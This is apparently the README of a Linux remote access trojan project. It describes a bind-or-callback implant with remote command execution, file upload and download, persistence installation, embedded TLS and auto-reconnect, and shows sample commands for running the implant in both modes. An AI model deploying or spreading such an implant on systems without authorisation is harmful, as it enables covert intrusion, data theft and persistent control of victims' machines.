Linux remote access trojan (RAT)

Dependencies
============

    1. mbedTLS (for encryption)
    2. readline (to read input)
    3. ncurses (for readline)

All of them are included in source tree, and are linked statically. Only dependency that is loaded dynamically is libc itself.

rat.c

        -Port is configurable at runtime through the environment variable "P".  It will bind on all interfaces by default.
	 -Capable of calling back via "I" environment variable.

rat-client.c

        -Command history and tab completion provided by readline
        -Currently has 4 native commands:
                .quit - Closes that current client's connection
                .kill - Kills off the rat process and all the client's connection
                download <remote file> <local file> - Chunks a file, compresses it and sends it over.  Will verify the file transfer via SHAA1 hash
                upload <local file> <remote file> - Performs the same operation as download but uploads instead

rat binds and client connects to it
        
        remote shell> P=12345 ./rat
        local shell> ./rat-client 127.0.0.1 12345

rat calls back to client
        
        local shell> ./rat-client 12345
        remote_shell> I=127.0.0.1 P=12345 ./rat

HELP:
    run ".help" command in rat-client.

Changelog
=========

Improvements
------------

1. All dependencies are linked statically.
2. Support for "cd" command has been added
3. User and system level persistence has been added. User can check, install or uninstall user/system persistence.
4. CTRL-C is intercepted in rat client, and returns to input prompt (instead of killing it)
5. If connection between client and server breaks, client will re-establish connectivity on next command. If connection breaks in callback mode, server keeps trying connection to client at repeated intervals (set timeout to change this), until client issues .kill command.
6. SSL/TLS certificates can be generated and embedded in both sides. At the moment only self-signed certificates are supported. Use "generate_keys.sh" to generate new key pair, and merge in source tree.
7. Same code base can be built on MacOS too (not all features are supported on MacOS, e.g. persistence).
8. Timeout mechanism is provided to prevent client locking (in case sent command never finishes, or gets stuck)

Bugfixes
--------

1. Certificate validation has been fixed.
2. File corruption during download has been fixed.
3. Infinite loop during file upload has been fixed.
4. .help command has been added in server part.
5. Partial command output problem (command produces pretty big output, but only a part is read, and remaining data mingles output of subsequent commands) has been fixed.
